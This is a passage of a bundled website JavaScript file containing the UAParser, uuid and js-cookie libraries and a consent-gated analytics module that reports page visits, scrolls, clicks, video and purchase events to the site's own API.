[b, N], [p, h]], [/droid.+; (ec30|ps20|tc[2-8]\d[kx])\)/i], [u, [b, N], [p, g]], [/(ouya)/i, /(nintendo) ([wids3utch]+)/i], [b, u, [p, f]], [/droid.+; (shield) bui/i], [u, [b, "Nvidia"], [p, f]], [/(playstation [345portablevi]+)/i], [u, [b, R], [p, f]], [/\b(xbox(?: one)?(?!; xbox))[\); ]/i], [u, [b, A], [p, f]], [/smart-tv.+(samsung)/i], [b, [p, v]], [/hbbtv.+maple;(\d+)/i], [[u, /^/, "SmartTV"], [b, I], [p, v]], [/(nux; netcast.+smarttv|lg (netcast\.tv-201\d|android tv))/i], [[b, S], [p, v]], [/(apple) ?tv/i], [b, [u, "Apple TV"], [p, v]], [/crkey/i], [[u, "Chromecast"], [b, O], [p, v]], [/droid.+aft(\w)( bui|\))/i], [u, [b, k], [p, v]], [/\(dtv[\);].+(aquos)/i], [u, [b, "Sharp"], [p, v]], [/\b(roku)[\dx]*[\)\/]((?:dvp-)?[\d\.]*)/i, /hbbtv\/\d+\.\d+\.\d+ +\([\w ]*; *(\w[^;]*);([^;]*)/i], [[b, L], [u, L], [p, v]], [/\b(android tv|smart[- ]?tv|opera tv|tv; rv:)\b/i], [[p, v]], [/((pebble))app/i], [b, u, [p, y]], [/droid.+; (glass) \d/i], [u, [b, O], [p, y]], [/droid.+; (wt63?0{2,3})\)/i], [u, [b, N], [p, y]], [/(quest( 2)?)/i], [u, [b, q], [p, y]], [/(tesla)(?: qtcarbrowser|\/[-\w\.]+)/i], [b, [p, _]], [/droid .+?; ([^;]+?)(?: bui|\) applew).+? mobile safari/i], [u, [p, g]], [/droid .+?; ([^;]+?)(?: bui|\) applew).+?(?! mobile) safari/i], [u, [p, h]], [/\b((tablet|tab)[;\/]|focus\/\d(?!.+mobile))/i], [[p, h]], [/(phone|mobile(?:[;\/]| safari)|pda(?=.+windows ce))/i], [[p, g]], [/(android[-\w\. ]{0,9});.+buil/i], [u, [b, "Generic"]]],
                    engine: [[/windows.+ edge\/([\w\.]+)/i], [w, [l, "EdgeHTML"]], [/webkit\/537\.36.+chrome\/(?!27)([\w\.]+)/i], [w, [l, "Blink"]], [/(presto)\/([\w\.]+)/i, /(webkit|trident|netfront|netsurf|amaya|lynx|w3m|goanna)\/([\w\.]+)/i, /ekioh(flow)\/([\w\.]+)/i, /(khtml|tasman|links)[\/ ]\(?([\w\.]+)/i, /(icab)[\/ ]([23]\.[\d\.]+)/i], [l, w], [/rv\:([\w\.]{1,9})\b.+(gecko)/i], [w, l]],
                    os: [[/microsoft (windows) (vista|xp)/i], [l, w], [/(windows) nt 6\.2; (arm)/i, /(windows (?:phone(?: os)?|mobile))[\/ ]?([\d\.\w ]*)/i, /(windows)[\/ ]?([ntce\d\. ]+\w)(?!.+xbox)/i], [l, [w, z, $]], [/(win(?=3|9|n)|win 9x )([nt\d\.]+)/i], [[l, "Windows"], [w, z, $]], [/ip[honead]{2,4}\b(?:.*os ([\w]+) like mac|; opera)/i, /cfnetwork\/.+darwin/i], [[w, /_/g, "."], [l, "iOS"]], [/(mac os x) ?([\w\. ]*)/i, /(macintosh|mac_powerpc\b)(?!.+haiku)/i], [[l, "Mac OS"], [w, /_/g, "."]], [/droid ([\w\.]+)\b.+(android[- ]x86)/i], [w, l], [/(android|webos|qnx|bada|rim tablet os|maemo|meego|sailfish)[-\/ ]?([\w\.]*)/i, /(blackberry)\w*\/([\w\.]*)/i, /(tizen|kaios)[\/ ]([\w\.]+)/i, /\((series40);/i], [l, w], [/\(bb(10);/i], [w, [l, E]], [/(?:symbian ?os|symbos|s60(?=;)|series60)[-\/ ]?([\w\.]*)/i], [w, [l, "Symbian"]], [/mozilla\/[\d\.]+ \((?:mobile|tablet|tv|mobile; [\w ]+); rv:.+ gecko\/([\w\.]+)/i], [w, [l, "Firefox OS"]], [/web0s;.+rt(tv)/i, /\b(?:hp)?wos(?:browser)?\/([\w\.]+)/i], [w, [l, "webOS"]], [/crkey\/([\d\.]+)/i], [w, [l, "Chromecast"]], [/(cros) [\w]+ ([\w\.]+\w)/i], [[l, "Chromium OS"], w], [/(nintendo|playstation) ([wids345portablevuch]+)/i, /(xbox); +xbox ([^\);]+)/i, /\b(joli|palm)\b ?(?:os)?\/?([\w\.]*)/i, /(mint)[\/\(\) ]?(\w*)/i, /(mageia|vectorlinux)[; ]/i, /([kxln]?ubuntu|debian|suse|opensuse|gentoo|arch(?= linux)|slackware|fedora|mandriva|centos|pclinuxos|red ?hat|zenwalk|linpus|raspbian|plan 9|minix|risc os|contiki|deepin|manjaro|elementary os|sabayon|linspire)(?: gnu\/linux)?(?: enterprise)?(?:[- ]linux)?(?:-gnu)?[-\/ ]?(?!chrom|package)([-\w\.]*)/i, /(hurd|linux) ?([\w\.]*)/i, /(gnu) ?([\w\.]*)/i, /\b([-frentopcghs]{0,5}bsd|dragonfly)[\/ ]?(?!amd|[ix346]{1,2}86)([\w\.]*)/i, /(haiku) (\w+)/i], [l, w], [/(sunos) ?([\w\.\d]*)/i], [[l, "Solaris"], w], [/((?:open)?solaris)[-\/ ]?([\w\.]*)/i, /(aix) ((\d)(?=\.|\)| )[\w\.])*/i, /\b(beos|os\/2|amigaos|morphos|openvms|fuchsia|hp-ux)/i, /(unix) ?([\w\.]*)/i], [l, w]]
                  },
                  B = function (e, i) {
                    if (typeof e === c && (i = e, e = n), !(this instanceof B)) return new B(e, i).getResult();
                    var t = e || (typeof o !== s && o.navigator && o.navigator.userAgent ? o.navigator.userAgent : ""),
                      r = i ? function (e, i) {
                        var t = {};
                        for (var r in e) i[r] && i[r].length % 2 == 0 ? t[r] = i[r].concat(e[r]) : t[r] = e[r];
                        return t;
                      }(M, i) : M;
                    return this.getBrowser = function () {
                      var e,
                        i = {};
                      return i.name = n, i.version = n, D.call(i, t, r.browser), i.major = typeof (e = i.version) === d ? e.replace(/[^\d\.]/g, "").split(".")[0] : n, i;
                    }, this.getCPU = function () {
                      var e = {};
                      return e.architecture = n, D.call(e, t, r.cpu), e;
                    }, this.getDevice = function () {
                      var e = {};
                      return e.vendor = n, e.model = n, e.type = n, D.call(e, t, r.device), e;
                    }, this.getEngine = function () {
                      var e = {};
                      return e.name = n, e.version = n, D.call(e, t, r.engine), e;
                    }, this.getOS = function () {
                      var e = {};
                      return e.name = n, e.version = n, D.call(e, t, r.os), e;
                    }, this.getResult = function () {
                      return {
                        ua: this.getUA(),
                        browser: this.getBrowser(),
                        engine: this.getEngine(),
                        os: this.getOS(),
                        device: this.getDevice(),
                        cpu: this.getCPU()
                      };
                    }, this.getUA = function () {
                      return t;
                    }, this.setUA = function (e) {
                      return t = typeof e === d && e.length > 255 ? L(e, 255) : e, this;
                    }, this.setUA(t), this;
                  };
                B.VERSION = "1.0.2", B.BROWSER = U([l, w, "major"]), B.CPU = U([m]), B.DEVICE = U([u, b, p, f, g, v, h, y, _]), B.ENGINE = B.OS = U([l, w]), typeof i !== s ? (e.exports && (i = e.exports = B), i.UAParser = B) : t.amdO ? (r = function () {
                  return B;
                }.call(i, t, i, e)) === n || (e.exports = r) : typeof o !== s && (o.UAParser = B);
                var H = typeof o !== s && (o.jQuery || o.Zepto);
                if (H && !H.ua) {
                  var G = new B();
                  H.ua = G.getResult(), H.ua.get = function () {
                    return G.getUA();
                  }, H.ua.set = function (e) {
                    G.setUA(e);
                    var i = G.getResult();
                    for (var t in i) H.ua[t] = i[t];
                  };
                }
              }("object" == typeof window ? window : this);
            },
            877: (e, i, t) => {
              var r = t(570),
                o = t(171),
                n = o;
              n.v1 = r, n.v4 = o, e.exports = n;
            },
            327: e => {
              for (var i = [], t = 0; t < 256; ++t) i[t] = (t + 256).toString(16).substr(1);
              e.exports = function (e, t) {
                var r = t || 0,
                  o = i;
                return [o[e[r++]], o[e[r++]], o[e[r++]], o[e[r++]], "-", o[e[r++]], o[e[r++]], "-", o[e[r++]], o[e[r++]], "-", o[e[r++]], o[e[r++]], "-", o[e[r++]], o[e[r++]], o[e[r++]], o[e[r++]], o[e[r++]], o[e[r++]]].join("");
              };
            },
            217: e => {
              var i = "undefined" != typeof crypto && crypto.getRandomValues && crypto.getRandomValues.bind(crypto) || "undefined" != typeof msCrypto && "function" == typeof window.msCrypto.getRandomValues && msCrypto.getRandomValues.bind(msCrypto);
              if (i) {
                var t = new Uint8Array(16);
                e.exports = function () {
                  return i(t), t;
                };
              } else {
                var r = new Array(16);
                e.exports = function () {
                  for (var e, i = 0; i < 16; i++) 0 == (3 & i) && (e = 4294967296 * Math.random()), r[i] = e >>> ((3 & i) << 3) & 255;
                  return r;
                };
              }
            },
            570: (e, i, t) => {
              var r,
                o,
                n = t(217),
                a = t(327),
                s = 0,
                c = 0;
              e.exports = function (e, i, t) {
                var d = i && t || 0,
                  u = i || [],
                  l = (e = e || {}).node || r,
                  p = void 0 !== e.clockseq ? e.clockseq : o;
                if (null == l || null == p) {
                  var b = n();
                  null == l && (l = r = [1 | b[0], b[1], b[2], b[3], b[4], b[5]]), null == p && (p = o = 16383 & (b[6] << 8 | b[7]));
                }
                var w = void 0 !== e.msecs ? e.msecs : new Date().getTime(),
                  m = void 0 !== e.nsecs ? e.nsecs : c + 1,
                  f = w - s + (m - c) / 1e4;
                if (f < 0 && void 0 === e.clockseq && (p = p + 1 & 16383), (f < 0 || w > s) && void 0 === e.nsecs && (m = 0), m >= 1e4) throw new Error("uuid.v1(): Can't create more than 10M uuids/sec");
                s = w, c = m, o = p;
                var g = (1e4 * (268435455 & (w += 122192928e5)) + m) % 4294967296;
                u[d++] = g >>> 24 & 255, u[d++] = g >>> 16 & 255, u[d++] = g >>> 8 & 255, u[d++] = 255 & g;
                var h = w / 4294967296 * 1e4 & 268435455;
                u[d++] = h >>> 8 & 255, u[d++] = 255 & h, u[d++] = h >>> 24 & 15 | 16, u[d++] = h >>> 16 & 255, u[d++] = p >>> 8 | 128, u[d++] = 255 & p;
                for (var v = 0; v < 6; ++v) u[d + v] = l[v];
                return i || a(u);
              };
            },
            171: (e, i, t) => {
              var r = t(217),
                o = t(327);
              e.exports = function (e, i, t) {
                var n = i && t || 0;
                "string" == typeof e && (i = "binary" === e ? new Array(16) : null, e = null);
                var a = (e = e || {}).random || (e.rng || r)();
                if (a[6] = 15 & a[6] | 64, a[8] = 63 & a[8] | 128, i) for (var s = 0; s < 16; ++s) i[n + s] = a[s];
                return i || o(a);
              };
            }
          },
          i = {};
        function t(r) {
          var o = i[r];
          if (void 0 !== o) return o.exports;
          var n = i[r] = {
            exports: {}
          };
          return e[r].call(n.exports, n, n.exports, t), n.exports;
        }
        t.amdO = {}, t.n = e => {
          var i = e && e.__esModule ? () => e.default : () => e;
          return t.d(i, {
            a: i
          }), i;
        }, t.d = (e, i) => {
          for (var r in i) t.o(i, r) && !t.o(e, r) && Object.defineProperty(e, r, {
            enumerable: !0,
            get: i[r]
          });
        }, t.o = (e, i) => Object.prototype.hasOwnProperty.call(e, i), t.r = e => {
          "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
          }), Object.defineProperty(e, "__esModule", {
            value: !0
          });
        };
        var r = {};
        return (() => {
          "use strict";

          t.r(r), t.d(r, {
            Analytics: () => _,
            default: () => k,
            events: () => e
          });
          var e = {};
          function i(e) {
            for (var i = 1; i < arguments.length; i++) {
              var t = arguments[i];
              for (var r in t) e[r] = t[r];
            }
            return e;
          }
          t.r(e), t.d(e, {
            ATTRIBUTION_SOURCE_SELECTED: () => w,
            BUTTON_CLICKED: () => b,
            ELEMENT_IN_VIEW: () => m,
            PAGE_SCROLLED: () => f,
            PAGE_VISITED: () => p,
            PURCHASE_EVENT: () => g,
            VIDEO_PLAYBACK_PAUSED: () => l,
            VIDEO_PLAYBACK_STARTED: () => u
          });
          var o = function e(t, r) {
            function o(e, o, n) {
              if ("undefined" != typeof document) {
                "number" == typeof (n = i({}, r, n)).expires && (n.expires = new Date(Date.now() + 864e5 * n.expires)), n.expires && (n.expires = n.expires.toUTCString()), e = encodeURIComponent(e).replace(/%(2[346B]|5E|60|7C)/g, decodeURIComponent).replace(/[()]/g, escape);
                var a = "";
                for (var s in n) n[s] && (a += "; " + s, !0 !== n[s] && (a += "=" + n[s].split(";")[0]));
                return document.cookie = e + "=" + t.write(o, e) + a;
              }
            }
            return Object.create({
              set: o,
              get: function (e) {
                if ("undefined" != typeof document && (!arguments.length || e)) {
                  for (var i = document.cookie ? document.cookie.split("; ") : [], r = {}, o = 0; o < i.length; o++) {
                    var n = i[o].split("="),
                      a = n.slice(1).join("=");
                    try {
                      var s = decodeURIComponent(n[0]);
                      if (r[s] = t.read(a, s), e === s) break;
                    } catch (e) {}
                  }
                  return e ? r[e] : r;
                }
              },
              remove: function (e, t) {
                o(e, "", i({}, t, {
                  expires: -1
                }));
              },
              withAttributes: function (t) {
                return e(this.converter, i({}, this.attributes, t));
              },
              withConverter: function (t) {
                return e(i({}, this.converter, t), this.attributes);
              }
            }, {
              attributes: {
                value: Object.freeze(r)
              },
              converter: {
                value: Object.freeze(t)
              }
            });
          }({
            read: function (e) {
              return '"' === e[0] && (e = e.slice(1, -1)), e.replace(/(%[\dA-F]{2})+/gi, decodeURIComponent);
            },
            write: function (e) {
              return encodeURIComponent(e).replace(/%(2[346BF]|3[AC-F]|40|5[BDE]|60|7[BCD])/g, decodeURIComponent);
            }
          }, {
            path: "/"
          });
          const n = o;
          var a = t(877),
            s = t(563),
            c = t(238),
            d = t.n(c);
          const u = "web_video_playback_started",
            l = "web_video_playback_paused",
            p = "web_page_visited",
            b = "web_button_clicked",
            w = "attribution_selected",
            m = "web_element_in_view",
            f = "web_page_scrolled",
            g = "web_purchase_event",
            h = {
              202: "Accepted",
              502: "Bad Gateway",
              400: "Bad Request",
              409: "Conflict",
              100: "Continue",
              201: "Created",
              417: "Expectation Failed",
              424: "Failed Dependency",
              403: "Forbidden",
              504: "Gateway Timeout",
              410: "Gone",
              505: "HTTP Version Not Supported",
              418: "I'm a teapot",
              419: "Insufficient Space on Resource",
              507: "Insufficient Storage",
              500: "Server Error",
              411: "Length Required",
              423: "Locked",
              420: "Method Failure",
              405: "Method Not Allowed",
              301: "Moved Permanently",
              302: "Moved Temporarily",
              207: "Multi-Status",
              300: "Multiple Choices",
              511: "Network Authentication Required",
              204: "No Content",
              203: "Non Authoritative Information",
              406: "Not Acceptable",
              404: "Not Found",
              501: "Not Implemented",
              304: "Not Modified",
              200: "OK",
              206: "Partial Content",
              402: "Payment Required",
              308: "Permanent Redirect",
              412: "Precondition Failed",
              428: "Precondition Required",
              102: "Processing",
              407: "Proxy Authentication Required",
              431: "Request Header Fields Too Large",
              408: "Request Timeout",
              413: "Request Entity Too Large",
              414: "Request-URI Too Long",
              416: "Requested Range Not Satisfiable",
              205: "Reset Content",
              303: "See Other",
              503: "Service Unavailable",
              101: "Switching Protocols",
              307: "Temporary Redirect",
              429: "Too Many Requests",
              401: "Unauthorized",
              422: "Unprocessable Entity",
              415: "Unsupported Media Type",
              305: "Use Proxy"
            },
            v = {
              baseUrl: "https://stagingapi.yousician.com",
              cookies: {
                visitID: {
                  options: {
                    domain: ".yousician.com",
                    secure: !1,
                    path: "/",
                    sameSite: "lax",
                    expires: 30
                  },
                  name: "ys_visit"
                },
                visitorID: {
                  options: {
                    domain: ".yousician.com",
                    secure: !1,
                    path: "/",
                    sameSite: "lax",
                    expires: 1051200
                  },
                  name: "ys_visitor"
                }
              }
            };
          class y {
            constructor(e) {
              if (this.trackReferenceSource = e => {
                if (!this.profileId) throw new Error("profile id not found.\nRun setProfileId() before tracking the event");
                if (!(null == e ? void 0 : e.attributionSource)) throw new Error("attributionSource must be defined");
                if (!this._hasCookieConsent) return;
                const {
                    attributionSource: i,
                    instrument: t
                  } = e,
                  r = Object.assign({
                    attribution_source: i,
                    device_id: (0, a.v4)(),
                    profile_id: this.profileId
                  }, {
                    instrument: t
                  });
                this._queueEvent({
                  name: w,
                  body: r
                });
              }, !e) throw new Error("[Analytics config] config object is required");
              const i = {
                channel: e.channel,
                xApplicationName: e.xApplicationName
              };
              if (Object.values(i).some(e => void 0 === e)) {
                const e = [];
                for (const [t, r] of Object.entries(i)) void 0 === r && e.push(t);
                throw new Error(`[Analytics config] mandatory argument${e.length > 1 ? "s" : ""} undefined: ${e.join(", ")}`);
              }
              void 0 === e.baseUrl && console.warn(`[Analytics config] baseUrl is undefined, it will default to \`${v.baseUrl}\``), y.initialized && console.warn("Analytics already initialized!"), this.config = Object.assign(Object.assign({}, v), e), this.eventsQueue = [], this.UAParser = new (d())(), this.profileId = e.profileId, this.isLandingPage = e.isLandingPage, this.landingPageCategory = e.landingPageCategory, this._hasCookieConsent() && !this._getVisitorId() && this._setVisitorCookie(), y.initialized = !0;
            }
            _callApi(e, i) {
              const t = new XMLHttpRequest();
              t.open("POST", e, !1), t.setRequestHeader("Content-Type", "application/json;charset=UTF-8"), t.setRequestHeader("X-Application-Name", this.config.xApplicationName), t.send(JSON.stringify(i));
            }
            _hasCookieConsent(e = "C0001") {
              if ("C0001" === e) return !0;
              if (!window.OnetrustActiveGroups) throw new Error('The event requires cookie consent. \n"OnetrustActiveGroups" must be available in the window object');
              return window.OnetrustActiveGroups.includes(e);
            }
            _setVisitCookie() {
              this._setCookie(this.config.cookies.visitID, (0, a.v4)());
            }
            _setVisitorCookie() {
              this._setCookie(this.config.cookies.visitorID, (0, a.v4)());
            }
            _getCookie(e) {
              return n.get(e);
            }
            _setCookie(e, i) {
              let t = e.options;
              if (e.options.expires) {
                const i = new Date();
                t = Object.assign(Object.assign({}, t), {
                  expires: new Date(i.setTime(i.getTime() + 60 * Number(e.options.expires) * 1e3))
                });
              }
              return n.set(e.name, i, t);
            }
            _getVisitId() {
              return this._getCookie(this.config.cookies.visitID.name);
            }
            _getVisitorId() {
              return this._getCookie(this.config.cookies.visitorID.name);
            }
            _getReferrer() {
              return this.referrer || document.referrer || void 0;
            }
            _strSlugify(e) {
              return e.toString().toLowerCase().replace(/\s+/g, "-").replace(/[^\w-]+/g, "").replace(/--+/g, "-").replace(/^-+/, "").replace(/-+$/, "");
            }
            _defaultParams() {
              const e = s.parse(location.search),
                {
                  utm_source: i,
                  utm_campaign: t,
                  utm_content: r,
                  utm_medium: o,
                  utm_term: n
                } = e,
                a = this.UAParser.getResult(),
                c = this.profileId,
                d = window.Leanplum ? window.Leanplum.getVariants().map(e => e.id).join(",") : void 0,
                u = this._getReferrer();
              return this._getVisitId() || this._setVisitCookie(), this._getVisitorId() || this._setVisitorCookie(), Object.assign({
                path: window.location.pathname,
                visit_token: this._getVisitId(),
                visitor_token: this._getVisitorId(),
                channel: this.config.channel,
                visitor_browser: `${a.browser.name} ${a.browser.version}`,
                visitor_os: `${a.os.name} ${a.os.version}`,
                visitor_device_type: a.device.type || "desktop",
                platform: a.os.name,
                user_agent: window.navigator.userAgent,
                url: window.location.href
              }, {
                utm_campaign: t,
                utm_content: r,
                utm_medium: o,
                utm_source: i,
                utm_term: n,
                referring_url: u,
                profile_id: c,
                variants: d,
                visitor_city: "",
                visitor_region: "",
                visitor_country: ""
              });
            }
            _prepareHttpParams(e) {
              return {
                data: Object.assign(Object.assign({}, this._defaultParams()), e)
              };
            }
            _queueEvent(e) {
              this.eventsQueue.push(e), this._sendQueuedEvents();
            }
            _sendQueuedEvents() {
              if (!this.sendingEvents && this.eventsQueue.length && this._hasCookieConsent()) {
                for (this.sendingEvents = !0; this.eventsQueue.length > 0;) {
                  const e = this.eventsQueue.shift();
                  this._callApi(`${this.config.baseUrl}/web_events/new/${e.name}`, this._prepareHttpParams(e.body));
                }
                this.sendingEvents = !1;
              }
            }
            trackPageVisit(e, i = 200) {
              if (!e) throw new Error("pathName must be specified");
              const t = this.redirectedFrom,
                r = this.isLandingPage,
                o = this.landingPageCategory,
                n = {
                  initial_referral: window.document.referrer,
                  initial_referral_domain: self.origin
                },
                a = "2" === i.toString().charAt(0),
                s = {
                  success: a,
                  error_message: a ? "" : h[i]
                },
                c = Object.assign(Object.assign(Object.assign({
                  title: document.title,
                  page: this._strSlugify(e.replace(/\//g, "-")),
                  path: e
                }, s), n), {
                  redirected_from: t,
                  is_landing_page: r,
                  landing_page_category: o
                });
              this.redirectedFrom = void 0, this._queueEvent({
                name: p,
                body: c
              });
            }
            trackPageScroll() {
              const e = this.isLandingPage,
                i = this.landingPageCategory,
                t = Object.assign({
                  scrolled: 0
                }, {
                  is_landing_page: e,
                  landing_page_category: i
                });
              let r = {
                reached25Percent: !1,
                reached50Percent: !1,
                reached75Percent: !1,
                reached100Percent: !1
              };
              const o = e => {
                const i = e => {
                  r = {
                    reached25Percent: 25 === e,
                    reached50Percent: 50 === e,
                    reached75Percent: 75 === e,
                    reached100Percent: 100 === e
                  }, 0 !== e && (t.scrolled = e, this._queueEvent({
                    name: f,
                    body: t
                  }));
                };
                switch (!0) {
                  case e < 25:
                    i(0);
                    break;
                  case e >= 25 && e < 50 && !r.reached25Percent:
                    i(25);
                    break;
                  case e >= 50 && e < 75 && !r.reached50Percent:
                    i(50);
                    break;
                  case e >= 75 && e < 100 && !r.reached75Percent:
                    i(75), t.scrolled = 75;
                    break;
                  case e >= 100 && !r.reached100Percent:
                    i(100), t.scrolled = 100;
                }
              };
              document.addEventListener("scroll", () => {
                const e = (() => {
                  const e = window.scrollY / (document.body.offsetHeight - window.innerHeight);
                  return Math.round(100 * e);
                })();
                o(e);
              });
            }
            trackPurchaseEvent(e) {
              this._queueEvent({
                name: g,
                body: e
              });
            }
            trackClick(e) {
              if (!this._hasCookieConsent()) return;
              e || console.warn("the click event has no parameters"), (null == e ? void 0 : e.name) && (e.name = e.name.toLowerCase()), (null == e ? void 0 : e.context) && (e.context = e.context.toLowerCase());
              const i = this.isLandingPage,
                t = this.landingPageCategory;
              e = Object.assign(Object.assign({}, e), {
                is_landing_page: i,
                landing_page_category: t
              }), this._queueEvent({
                name: b,
                body: e
              });
            }
            trackElementInView(e) {
              if (!this._hasCookieConsent()) return;
              const i = this.isLandingPage,
                t = this.landingPageCategory,
                r = document.querySelector(`#${e.id}`);
              new IntersectionObserver(r => {
                r.forEach(r => {
                  r.isIntersecting && (e = Object.assign(Object.assign({}, e), {
                    is_landing_page: i,
                    landing_page_category: t
                  }), this._queueEvent({
                    name: m,
                    body: e
                  }));
                });
              }, {
                root: null,
                threshold: 1
              }).observe(r);
            }
            trackVideoEvent(e) {
              const i = [u, l];
              if (!e) throw new Error("parameters must be specified");
              const {
                attributes: t,
                eventType: r,
                videoId: o,
                videoTitle: n,
                sessionId: s,
                trackWordPressSection: c,
                domElement: d
              } = e;
              if (!Object.values(i).includes(r)) throw new Error(`Unsupported event type. Allowed events:\n${i.join(",\n")}`);
              if (!t) throw new Error("Attributes must be specified.");
              if (["src", "currentTime", "totalDuration", "autoPlay", "muted"].forEach(e => {
                if (void 0 === t[e]) throw new Error(`Needed video attribute ${e} is not defined. Please include it in "attributes".`);
              }), !this._hasCookieConsent()) return;
              if (c && !d) throw new Error("DOM video element must be specified to track the ACF section.");
              const p = o || t.src;
              this.trackedVideos || (this.trackedVideos = {});
              let b = this.trackedVideos[p];
              if (!b) {
                const e = c && d.closest("[class*='section-']") && d.closest("[class*='section-']").className.match(/section-[^\s]*/i)[0] || void 0,
                  i = n;
                b = Object.assign({
                  web_video_content_src: t.src,
                  web_video_content_id: p,
                  web_video_content_total_duration: t.totalDuration,
                  web_video_playback_autoplay: t.autoPlay,
                  web_video_playback_muted: t.muted,
                  web_video_playback_session_id: s || (0, a.v4)(),
                  web_video_playback_position: t.currentTime
                }, {
                  web_video_player_position: e,
                  web_video_content_title: i
                }), this.trackedVideos[p] = b;
              }
              b.web_video_playback_position = t.currentTime, this._queueEvent({
                name: r,
                body: b
              });
            }
            setReferrer(e) {
              this.referrer = e;
            }
            setRedirectedFrom(e) {
              this.redirectedFrom = e;
            }
            setProfileId(e) {
              this.profileId = e;
            }
            setIsLandingPage(e) {
              this.isLandingPage = e;
            }
            setLandingPageCategory(e) {
              this.landingPageCategory = e;
            }
          }
          y.initialized = !1;
          const _ = y,
            k = y;
        })(), r;
      })();
    });

    /***/
  }),
  /***/"../node_modules/js-cookie/src/js.cookie.js": (
  /*!**************************************************!*\
    !*** ../node_modules/js-cookie/src/js.cookie.js ***!
    \**************************************************/
  /*! no static exports found */
  /***/
  function (module, exports, __webpack_require__) {
    var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__; /*!
                                                                       * JavaScript Cookie v2.2.1
                                                                       * https://github.com/js-cookie/js-cookie
                                                                       *
                                                                       * Copyright 2006, 2015 Klaus Hartl & Fagner Brack
                                                                       * Released under the MIT license
                                                                       */
    ;
    (function (factory) {
      var registeredInModuleLoader;
      if (true) {
        !(__WEBPACK_AMD_DEFINE_FACTORY__ = factory, __WEBPACK_AMD_DEFINE_RESULT__ = typeof __WEBPACK_AMD_DEFINE_FACTORY__ === 'function' ? __WEBPACK_AMD_DEFINE_FACTORY__.call(exports, __webpack_require__, exports, module) : __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        registeredInModuleLoader = true;
      }
      if (true) {
        module.exports = factory();
        registeredInModuleLoader = true;
      }
      if (!registeredInModuleLoader) {
        var OldCookies = window.Cookies;
        var api = window.Cookies = factory();
        api.noConflict = function () {
          window.Cookies = OldCookies;
          return api;
        };
      }
    })(function () {
      function extend() {
        var i = 0;
        var result = {};
        for (; i < arguments.length; i++) {
          var attributes = arguments[i];
          for (var key in attributes) {
            result[key] = attributes[key];
          }
        }
        return result;
      }
      function decode(s) {
        return s.replace(/(%[0-9A-Z]{2})+/g, decodeURIComponent);
      }
      function init(converter) {
        function api() {}
        function set(key, value, attributes) {
          if (typeof document === 'undefined') {
            return;
          }
          attributes = extend({
            path: '/'
          }, api.defaults, attributes);
          if (typeof attributes.expires === 'number') {
            attributes.expires = new Date(new Date() * 1 + attributes.expires * 864e+5);
          }

          // We're using "expires" because "max-age" is not supported by IE
          attributes.expires = attributes.expires ? attributes.expires.toUTCString() : '';
          try {
            var result = JSON.stringify(value);
            if (/^[\{\[]/.test(result)) {
              value = result;
            }
          } catch (e) {}
          value = converter.write ? converter.write(value, key) : encodeURIComponent(String(value)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent);
          key = encodeURIComponent(String(key)).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent).replace(/[\(\)]/g, escape);
          var stringifiedAttributes = '';
          for (var attributeName in attributes) {
            if (!attributes[attributeName]) {
              continue;
            }
            stringifiedAttributes += '; ' + attributeName;
            if (attributes[attributeName] === true) {
              continue;
            }

            // Considers RFC 6265 section 5.2:
            // ...
            // 3.  If the remaining unparsed-attributes contains a %x3B (";")
            //     character:
            // Consume the characters of the unparsed-attributes up to,
            // not including, the first %x3B (";") character.
            // ...
            stringifiedAttributes += '=' + attributes[attributeName].split(';')[0];
          }
          return document.cookie = key + '=' + value + stringifiedAttributes;
        }
        function get(key, json) {
          if (typeof document === 'undefined') {
            return;
          }
          var jar = {};
          // To prevent the for loop in the first place assign an empty array
          // in case there are no cookies at all.
          var cookies = document.cookie ? document.cookie.split('; ') : [];
          var i = 0;
          for (; i < cookies.length; i++) {
            var parts = cookies[i].split('=');
            var cookie = parts.slice(1).join('=');
            if (!json && cookie.charAt(0) === '"') {
              cookie = cookie.slice(1, -1);
            }
            try {
              var name = decode(parts[0]);
              cookie = (converter.read || converter)(cookie, name) || decode(cookie);
              if (json) {
                try {
                  cookie = JSON.parse(cookie);
                } catch (e) {}
              }
              jar[name] = cookie;
              if (key === name) {
                break;
              }
            } catch (e) {}
          }
          return key ? jar[key] : jar;
        }
        api.set = set;
        api.get = function (key) {
          return get(key, false /* read as raw */);
        };
        api.getJSON = function (key) {
          return get(key, true /* read as json */);
        };
        api.remove = function (key, attributes) {
          set(key, '', extend(attributes, {
            expires: -1
          }));
        };
        api.defaults = {};
        api.withConverter = init;
        return api;
      }
      return init(function () {});
    });

    /***/
  }),
  /***/"./scripts/analytics.js": (
  /*!******************************!*\
    !*** ./scripts/analytics.js ***!
    \******************************/
  /*! exports provided: initAnalytics */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony export (binding) */
    __webpack_require__.d(__webpack_exports__, "initAnalytics", function () {
      return initAnalytics;
    });
    /* harmony import */
    var _yousiciangit_ys_analytics__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @yousiciangit/ys-analytics */"../node_modules/@yousiciangit/ys-analytics/library/dist/index.js");
    /* harmony import */
    var _yousiciangit_ys_analytics__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_yousiciangit_ys_analytics__WEBPACK_IMPORTED_MODULE_0__);
    /* harmony import */
    var js_cookie__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! js-cookie */"../node_modules/js-cookie/src/js.cookie.js");
    /* harmony import */
    var js_cookie__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(js_cookie__WEBPACK_IMPORTED_MODULE_1__);
    /* 
        This file is for all analytics related initialisation
        It will be called from headScripts.js, as it usually has to happen as soon as possible
    */

    /* eslint-disable no-console */

    // could be fetched from a WP editor
    // feature toggles to be checked in Unleash
    const featureIds = [
    // e.g. "ukulele_signup_questionnaire"
    "campfire_alternate"];

    // could be fetched from a WP editor
    const redirectionExperiments = [
    // the current URL must match <path> and
    // user has to be in <feature_id> experiment
